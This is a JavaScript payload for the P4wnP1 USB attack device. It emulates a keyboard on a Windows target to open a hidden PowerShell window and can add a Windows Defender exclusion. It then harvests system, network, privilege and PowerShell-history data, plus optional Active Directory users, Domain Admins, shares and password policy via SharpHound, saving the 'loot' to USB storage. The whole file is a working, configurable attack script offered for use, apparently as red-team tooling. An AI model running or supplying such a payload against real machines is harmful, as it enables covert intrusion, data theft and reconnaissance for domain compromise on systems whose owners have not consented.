/*############################################################################################################################################\
# recon.js                                                                                                                                    #
#   Extraction of Local and/or Domain data. Saved to P4wnP1 mass storage or to another mass storage of your choice.                           #
#                                                                                                                                             #
#   Author: cac3r                                                                                                                             #
#                                                                                                                                             #
# PREREQUISTES:                                                                                                                               #
# - Enable keyboard capability and, if you want to extract directly to P4wnP1's microSD, USB mass storage capability in settings.             #
# - If using Recon > Domain > SharpHound: Add SharpHound.exe to the root of the external USB device or to P4wnP1:\tools if using PI microSD.  #
# - Edit global settings below.                                                                                                               #
\############################################################################################################################################*/

/////////// GLOBAL SETTINGS //////////\
// GENERAL                           // ---
layout("us");                        // Keyboard layout
typingSpeed(0,0);                    // Typing speed
run_as_admin=false;                  // Set to true to execute powershell as Administrator
extract_to_ssd=true;                 // Set to true to extract everything to an external SSD. Set to false to extract to the Pi Internal microSD storage (USB Mass Storage on P4WNPI settings)
hide=true;                           // Set to true to hide the console window on the target
exit=true;                           // Set to true to exit the console once finished
modify_defender=false;               // Disable and enable Windows defender in the process of this script (Powershell must be run as Administrator for this to work [run_as_admin=true])
var usb_drive = "pi_usb"             // The name of the P4wnP1's USB storage device, which will be used if extract_to_ssd = false
var ssd_drive = "USB_OUT";           // The name of your external SSD drive, which will be used if extract_to_ssd = true
// RECON                             // ---                                                                                     
extract_local_recon_data=true;       // Set to true to run commands to discover local information about the machine target (Basic PS commands. Data: IP, open Ports, system information, PS History, ...)
extract_domain_recon_data=false;     // Set to true to run commands to discover domain information about the machine target if applicable (AD PS Module. Data: Domain name, Users, Groups, Shares, ...)
sharphound=false;                    // Set to true to run SharpHound full collection. SharpHound.exe must be present on chosen storage. Read PREREQUISITES
///////////////////////////////////////

// Definition of other variables, arrays, ...
var delay_time = 1                                                 // The time to wait before executing the attack in seconds
var ready = "False"                                                // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                                           // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)                                // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                                       // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                                        // Stop the while loop
            break;
        }
    }
}
function attack() {
  // Open powershell
    press("GUI r");
    delay(500);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");     // Hide the console if chosen to do so
    if (run_as_admin) {                                                        // Run powershell either as admin or standard user
        press("CTRL SHIFT ENTER");
	    delay(1000);
        press("LEFT");
        delay(200);
        press("ENTER");
        delay(200);
    } else {
        type("\n");
        delay(1000);
    }

  // Identify path/directory names
    if (extract_to_ssd) {
      type("$usbPath =((gwmi win32_volume -f 'label=''" + ssd_drive + "''').Name);");
    } else {
      type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
    }
    type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
    type("$lootfolder = 'loot_' +$timestamp;");
  
  // Disable Windows Defender
  if (modify_defender && run_as_admin) {
    type("Import-Module Defender;\n");
    type("Set-MpPreference -ExclusionPath $usbPath;\n");
    delay(1000)
  }

  // Create directories
    if (extract_local_recon_data) type("$lootPathLoco = $usbPath+ '' +$lootfolder+ '\\local\';mkdir $lootPathLoco;");
    if (extract_domain_recon_data) type("$lootPathDomo = $usbPath+ '' +$lootfolder+ '\\domain\';mkdir $lootPathDomo;"); 
    delay(100);

  // Run recon commands and extract output files
    // LOCAL
    if (extract_local_recon_data) {
      //type("<CMD> | Out-File -FilePath ($lootPathLoco + '_<CMD>.txt');");             
      type("ipconfig /all | Out-File -FilePath ($lootPathLoco + '_ipconfig.txt');");   // ifconfig
      type("\n")
      delay(10) 
      type("hostname | Out-File -FilePath ($lootPathLoco + '_hostname.txt');");        // hostname
      type("\n")
      delay(100) 
      type("systeminfo | Out-File -FilePath ($lootPathLoco + '_systeminfo.txt');");    // systeminfo
      type("\n")
      delay(100) 
      type("whoami /all | Out-File -FilePath ($lootPathLoco + '_whoami.txt');");       // whoami
      type("\n")
      delay(200) 
      type("Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,State | Sort-Object -Property LocalPort | Format-Table | Out-File -FilePath ($lootPathLoco + '_ports.txt');");  // TCP open Port scan
      type("\n")
      delay(1000) 
      type("Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File -FilePath ($lootPathLoco + '_PSHistory.txt');");    // PowerShell History
      type("\n")
      delay(200)
    }
    // DOMAIN (AD)
    if (extract_domain_recon_data) {
      //type("<CMD> | Out-File -FilePath ($lootPathDomo + '<CMD>.txt');");
      type("Import-Module ActiveDirectory;");                                         // Import AD module
      type("\n")        
      type("Get-ADDomain | Out-File -FilePath ($lootPathDomo + '_ADDomain.txt');");  // Get Domain information
      type("\n")
      delay(60) 
      type("Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)' | Out-File -FilePath ($lootPathDomo + '_ADUsers.txt');");  // Get Domain Users
      type("\n")
      delay(100) 
      type("Get-ADGroup -Filter * | select name | Out-File -FilePath ($lootPathDomo + '_ADGroups.txt');");      // Get Domain Groups
      type("\n")
      delay(200) 
      type("Get-ADGroupMember -Identity 'Domain Admins' | Out-File -FilePath ($lootPathDomo + '_DAs.txt');");   // Get Accounts member of Domain Admins
      type("\n")
      delay(200)
      type("Get-SMBShare | Out-File -FilePath ($lootPathDomo + '_Shares.txt');")                                // Get Shares information (no share download)
      type("\n")
      delay(200)
      type("Get-ADDefaultDomainPasswordPolicy | Out-File -FilePath ($lootPathDomo + '_PassPol.txt');")          // Get Domain Password Policy
      type("\n")
      delay(100) 
    }

    // SharpHound
    if (extract_domain_recon_data && sharphound) {
      type("cd $usbPath;\n");                                    // Change directory to USB/Pi storage 
      type("SharpHound.exe -c All --zipfilename SharpH.zip;")    // Run SharpHound full collection. Out to zip
      type("\n")
      delay(1000)
    }

  // Clean up
    if (modify_defender) {
      type("Remove-MpPreference -ExclusionPath $usbPath;\n");                 // Enable Windows Defender again
    }
  
  // Exit the console if chosen to do so      
    if (exit) { type("exit\n"); }
}

delay(delay_time * 100);
check_if_ready();
attack();
